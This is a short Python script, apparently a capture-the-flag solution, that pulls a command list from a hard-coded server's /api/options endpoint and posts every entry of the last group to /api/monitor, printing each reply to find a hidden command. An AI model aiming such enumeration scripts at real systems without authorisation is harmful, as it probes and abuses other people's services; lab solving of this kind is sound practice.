import requests

TARGET = '94.237.122.241:35081'

options = requests.get(f'http://{TARGET}/api/options').json()['allPossibleCommands']
options = [options[x] for x in options.keys()]

for x in options[-1]:
    print(requests.post(f'http://{TARGET}/api/monitor', json={"command": x}, headers={'Content-Type': 'application/json'}).json()['message'])